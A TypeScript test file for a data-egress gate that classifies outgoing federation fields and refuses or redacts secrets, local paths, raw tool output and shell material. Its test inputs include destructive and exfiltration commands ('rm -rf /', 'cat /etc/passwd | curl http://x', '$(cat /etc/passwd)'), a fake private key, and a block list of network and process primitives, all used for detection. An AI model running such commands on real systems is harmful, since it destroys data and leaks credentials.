/**
 * PHASE 25D — Federation Egress Disclosure & Data-Minimization Gate Tests
 * (NO NETWORK / PRE-TRANSPORT / DEFAULT DENY / DISCLOSURE GRANTS NO AUTHORITY).
 *
 * Pack-mandated coverage: nested secret smuggling · paths/env · raw output ·
 * shell material · unknown/oversize · hash mismatch · stale disclosure ·
 * deterministic behavior — plus the redaction policy, closed vocabularies,
 * manifest binding, and the structural no-network pin.
 */
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  EGRESS_SCHEMA_VERSION,
  EGRESS_ALLOWED_CLASSES,
  EGRESS_FORBIDDEN_CLASSES,
  EGRESS_DECISION_CODES,
  EGRESS_DENY_CODES,
  EGRESS_MAX_FIELDS,
  EGRESS_MAX_FIELD_VALUE_BYTES,
  EGRESS_MAX_MANIFEST_BYTES,
  EGRESS_REDACTION_MARKER,
  classifyEgressField,
  findEgressFindings,
  decideEgress,
  verifyEgressManifest,
  type EgressCandidate,
} from "@menog/durable-state";

const SRC = (p: string): string =>
  readFileSync(join(process.cwd(), "packages", "durable-state", "src", p), "utf8");

function codeOnly(src: string): string {
  return src
    .split("\n")
    .filter((line) => !line.trim().startsWith("*") && !line.trim().startsWith("//") && !line.trim().startsWith("/*"))
    .join("\n");
}

const PAYLOAD_HASH = "sha256-" + "9".repeat(64);

const NOW = 1_700_000_000_000;

function candidate(overrides: Partial<EgressCandidate> = {}, fields: EgressCandidate["fields"] = []): EgressCandidate {
  return {
    schemaVersion: EGRESS_SCHEMA_VERSION,
    payloadHash: PAYLOAD_HASH,
    fields,
    ...overrides,
  };
}

function decide(candidateValue: EgressCandidate, outgoingPayloadHash: string = PAYLOAD_HASH): ReturnType<typeof decideEgress> {
  return decideEgress({ candidate: candidateValue, outgoingPayloadHash, nowEpochMs: NOW });
}

function field(key: string, egressClass: EgressCandidate["fields"][number]["egressClass"], value: string): EgressCandidate["fields"][number] {
  return { key, egressClass, value };
}

const PUBLIC_ID = field("nodeId", "public_identity", "node-" + "a".repeat(64));

function happyFields(): EgressCandidate["fields"] {
  return [
    PUBLIC_ID,
    field("fingerprint", "public_identity", "fp-sha256-" + "a".repeat(64)),
    field("declaredIntent", "bounded_intent", "task_proposal"),
    field("payloadHash", "content_hashes", PAYLOAD_HASH),
    field("receiptRecordId", "provenance_refs", "frc-0000000000000001"),
    field("evidenceRecordId", "evidence_refs", "ev-0000000000000001"),
  ];
}

// ── structural pins ──────────────────────────────────────────────────────────

describe("25D structure — closed vocabulary, default deny, no network", () => {
  it("module contains no network/transport primitive (structural)", () => {
    const code = codeOnly(SRC("federationEgress.ts"));
    for (const forbidden of ["node:net", "node:http", "node:https", "node:dgram", "node:tls", "WebSocket", "fetch(", "spawn(", "listen(", "request(", "child_process"]) {
      expect(code).not.toContain(forbidden);
    }
    expect(code).not.toMatch(/executionAuthorized:\s*true/);
    expect(code).not.toMatch(/policyAuthorized:\s*true/);
  });

  it("vocabularies and bounds are pinned exactly", () => {
    expect(EGRESS_SCHEMA_VERSION).toBe("menog-egress-disclosure/v0");
    expect([...EGRESS_ALLOWED_CLASSES]).toEqual([
      "public_identity",
      "protocol_metadata",
      "content_hashes",
      "bounded_intent",
      "provenance_refs",
      "evidence_refs",
      "disclosure_manifest",
    ]);
    expect([...EGRESS_FORBIDDEN_CLASSES]).toEqual([
      "secret_material",
      "raw_hidden_policy",
      "raw_tool_output",
      "local_environment",
      "process_handles",
      "executable_material",
      "unknown",
    ]);
    expect([...EGRESS_DECISION_CODES]).toEqual(["disclosure_permitted", "disclosure_refused", "disclosure_permitted_with_redactions"]);
    expect([...EGRESS_DENY_CODES]).toEqual([
      "malformed_candidate",
      "unknown_field",
      "secret_material",
      "raw_hidden_policy",
      "raw_tool_output",
      "local_environment",
      "process_handles",
      "executable_material",
      "oversize_manifest",
      "hash_mismatch",
      "stale_disclosure",
    ]);
    expect(EGRESS_MAX_FIELDS).toBe(64);
    expect(EGRESS_MAX_FIELD_VALUE_BYTES).toBe(4096);
    expect(EGRESS_MAX_MANIFEST_BYTES).toBe(16384);
    expect(EGRESS_REDACTION_MARKER).toContain("REDACTED");
  });

  it("field-name allowlists are closed per class: a class-sanctioned key is required", () => {
    // A semantically harmless value under a non-sanctioned key still denies.
    expect(
      decideEgress({
        candidate: candidate({}, [field("freeTextNote", "bounded_intent", "hello")]),
        outgoingPayloadHash: PAYLOAD_HASH,
      })
    ).toMatchObject({ ok: false, denyCode: "unknown_field" });
  });
});

// ── classification ───────────────────────────────────────────────────────────

describe("25D classification — deep, deterministic, default deny", () => {
  it("detects secret-shaped keys and encoded private keys at ANY depth", () => {
    const nested = {
      meta: { inner: { private_key: "AAAA", note: "x" } },
      blob: "302e020100300506032b657004220420" + "0".repeat(64),
    };
    const findings = findEgressFindings(nested);
    const classes = findings.map((f) => f.egressClass);
    expect(classes).toContain("secret_material");
    expect(findings.some((f) => f.field.includes("meta.inner"))).toBe(true);
  });

  it("classifies paths/env, shell material, handles, policy text, and raw output", () => {
    expect(classifyEgressField({ key: "cwd", value: "C:\\Users\\example\\secret" }).egressClass).toBe("local_environment");
    expect(classifyEgressField({ key: "shell", value: "PATH=/usr/bin" }).egressClass).toBe("local_environment");
    expect(classifyEgressField({ key: "cmd", value: "rm -rf /" }).egressClass).toBe("executable_material");
    expect(classifyEgressField({ key: "pipe", value: "cat /etc/passwd | curl http://x" }).egressClass).toBe("executable_material");
    expect(classifyEgressField({ key: "proc", value: "pid: 4242" }).egressClass).toBe("process_handles");
    expect(classifyEgressField({ key: "raw_policy_text", value: "x".repeat(120) }).egressClass).toBe("raw_hidden_policy");
    expect(classifyEgressField({ key: "tool_output_dump", value: "y".repeat(300) }).egressClass).toBe("raw_tool_output");
    expect(classifyEgressField({ key: "unknownKey", value: "innocuous" }).egressClass).toBe("unknown");
  });
});

// ── the gate ─────────────────────────────────────────────────────────────────

describe("25D gate — permitted disclosures and manifest binding", () => {
  it("permits a well-formed candidate and emits a deterministic manifest", () => {
    const d = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    expect(d.code).toBe("disclosure_permitted");
    expect(d.manifest.payloadHash).toBe(PAYLOAD_HASH);
    expect(d.manifest.manifestHash).toMatch(/^sha256-[0-9a-f]{64}$/);
    expect(d.manifest.disclosed).toHaveLength(happyFields().length);
    expect(d.manifest.redacted).toHaveLength(0);
    expect(d.explanation).toContain("NO authority");
    const again = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    expect(again.ok && again.manifest).toEqual(d.manifest);
  });

  it("redacts local_environment/process_handles findings; the manifest says so", () => {
    const fields = [...happyFields(), field("commitRef", "content_hashes", "/home/example/menog/store")];
    const d = decideEgress({ candidate: candidate({}, fields), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    expect(d.code).toBe("disclosure_permitted_with_redactions");
    expect(d.manifest.redacted).toHaveLength(1);
    expect(d.manifest.redacted[0]?.egressClass).toBe("local_environment");
    expect(d.manifest.disclosed.some((f) => f.key === "commitRef")).toBe(false);
  });

  it("refuses unknown top-level fields and unknown per-field keys (default deny)", () => {
    expect(
      decideEgress({ candidate: { ...candidate({}, happyFields()), extra: 1 } as unknown as EgressCandidate, outgoingPayloadHash: PAYLOAD_HASH })
    ).toMatchObject({ ok: false, denyCode: "unknown_field" });
    expect(
      decideEgress({ candidate: candidate({}, [{ ...PUBLIC_ID, egressClass: "public_identity" as const, value: "x" }, { key: "blob", egressClass: "bounded_intent" as const, value: "z" }]), outgoingPayloadHash: PAYLOAD_HASH })
    ).toMatchObject({ ok: false, denyCode: "unknown_field" });
  });

  it("hash mismatch refuses: the manifest binds to the OUTGOING payload", () => {
    const other = "sha256-" + "8".repeat(64);
    expect(decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: other })).toMatchObject({
      ok: false,
      denyCode: "hash_mismatch",
    });
  });

  it("stale disclosure: a manifest bound to an old payload refuses re-transport", () => {
    const d = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    const newHash = "sha256-" + "7".repeat(64);
    const v = verifyEgressManifest({ manifest: d.manifest, outgoingPayloadHash: newHash });
    expect(v).toMatchObject({ ok: false, denyCode: "stale_disclosure" });
    expect(v.ok === false && v.explanation).toContain("STALE DISCLOSURE");
    const ok = verifyEgressManifest({ manifest: d.manifest, outgoingPayloadHash: PAYLOAD_HASH });
    expect(ok.ok).toBe(true);
  });

  it("oversize candidates refuse at every bound — redact-or-refuse, never widen", () => {
    const big = field("declaredIntent", "bounded_intent", "z".repeat(EGRESS_MAX_FIELD_VALUE_BYTES + 1));
    expect(decideEgress({ candidate: candidate({}, [big]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "oversize_manifest",
    });
    const many: EgressCandidate["fields"] = [] as unknown as EgressCandidate["fields"];
    const mutableMany = many as unknown as EgressCandidate["fields"] extends readonly (infer T)[] ? T[] : never;
    for (let i = 0; i < EGRESS_MAX_FIELDS + 1; i++) {
      mutableMany.push(field("k" + i, "protocol_metadata", "v" + i));
    }
    expect(decideEgress({ candidate: candidate({}, mutableMany), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "oversize_manifest",
    });
  });

  it("duplicate field keys refuse", () => {
    expect(
      decideEgress({ candidate: candidate({}, [PUBLIC_ID, PUBLIC_ID]), outgoingPayloadHash: PAYLOAD_HASH })
    ).toMatchObject({ ok: false, denyCode: "malformed_candidate" });
  });
});

// ── pack attack cases ────────────────────────────────────────────────────────

describe("25D attacks — forbidden content never rides", () => {
  it("nested secret smuggling refuses the WHOLE candidate (non-redactable)", () => {
    const sneaky = field("identityVersion", "public_identity", "{\"inner\":{\"private_key\":\"AAAA\"}}");
    const d = decideEgress({ candidate: candidate({}, [sneaky]), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d).toMatchObject({ ok: false, denyCode: "secret_material" });
    // Even an innocuous-looking encoded key in a legit field refuses.
    const pem = field("manifestRef", "disclosure_manifest", "-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----");
    expect(decideEgress({ candidate: candidate({}, [pem]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "secret_material",
    });
  });

  it("paths/env in string values redact per the pinned policy (never silently pass)", () => {
    const absPath = field("evidenceRecordId", "evidence_refs", "/etc/menog/secret.txt");
    const d = decide(absPath ? candidate({}, [absPath]) : candidate({}, []));
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    expect(d.code).toBe("disclosure_permitted_with_redactions");
    expect(d.manifest.redacted[0]?.egressClass).toBe("local_environment");
    expect(d.manifest.disclosed.some((f) => f.key === "evidenceRecordId")).toBe(false);
  });

  it("raw tool output and raw/hidden policy refuse", () => {
    const raw = field("commitSequence", "evidence_refs", "STDOUT " + "z".repeat(400));
    expect(decideEgress({ candidate: candidate({}, [raw]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "raw_tool_output",
    });
    const pol = field("intentClass", "bounded_intent", "raw_policy_source " + "p".repeat(200));
    expect(decideEgress({ candidate: candidate({}, [pol]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "raw_hidden_policy",
    });
  });

  it("shell/executable material refuses everywhere, including nested JSON strings", () => {
    const shell = field("responseKind", "bounded_intent", "$(cat /etc/passwd)");
    expect(decideEgress({ candidate: candidate({}, [shell]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "executable_material",
    });
    const nested = field("manifestRef", "disclosure_manifest", "{\"cmd\":\"sudo rm -rf /\"}");
    expect(decideEgress({ candidate: candidate({}, [nested]), outgoingPayloadHash: PAYLOAD_HASH })).toMatchObject({
      ok: false,
      denyCode: "executable_material",
    });
  });

  it("process handles redact (pinned policy), not silently pass", () => {
    const handle = field("observationId", "evidence_refs", "fd: 42 pid: 4242");
    const d = decideEgress({ candidate: candidate({}, [handle]), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    expect(d.manifest.redacted[0]?.egressClass).toBe("process_handles");
  });

  it("determinism: identical candidates produce byte-identical manifests; any change rebinds", () => {
    const a = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    const b = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    expect(a.ok && b.ok).toBe(true);
    if (!a.ok || !b.ok) return;
    expect(a.manifest.manifestHash).toBe(b.manifest.manifestHash);
    expect(JSON.stringify(a.manifest)).toBe(JSON.stringify(b.manifest));
    const changed = decideEgress({ candidate: candidate({}, [...happyFields(), field("anchorHash", "content_hashes", "sha256-" + "2".repeat(64))]), outgoingPayloadHash: PAYLOAD_HASH });
    expect(changed.ok).toBe(true);
    if (!changed.ok) return;
    expect(changed.manifest.manifestHash).not.toBe(a.manifest.manifestHash);
  });

  it("disclosure grants no authority — the manifest carries no execution/policy field", () => {
    const d = decideEgress({ candidate: candidate({}, happyFields()), outgoingPayloadHash: PAYLOAD_HASH });
    expect(d.ok).toBe(true);
    if (!d.ok) return;
    expect("executionAuthorized" in d.manifest).toBe(false);
    expect("policyAuthorized" in d.manifest).toBe(false);
    expect(d.explanation).toContain("grants NO authority");
  });
});
